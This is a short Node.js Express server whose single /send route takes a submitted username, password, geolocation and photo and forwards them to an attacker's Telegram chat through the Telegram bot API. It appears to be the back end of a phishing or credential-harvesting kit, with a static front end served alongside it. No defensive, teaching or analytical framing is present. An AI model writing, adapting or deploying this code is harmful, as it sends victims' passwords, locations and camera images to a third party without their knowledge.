
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.static('public'));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

app.post('/send', async (req, res) => {
  const { username, password, location, photo } = req.body;
  const token = 'YOUR_TELEGRAM_BOT_TOKEN';
  const chat_id = 'YOUR_CHAT_ID';
  const caption = `👤 Username: ${username}\n🔑 Password: ${password}\n📍 Location: ${location}`;

  try {
    if (photo) {
      await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, {
        chat_id,
        caption,
        photo
      });
    } else {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id,
        text: caption
      });
    }
    res.send('Telegram message sent');
  } catch (err) {
    console.error(err);
    res.status(500).send('Error sending message to Telegram');
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
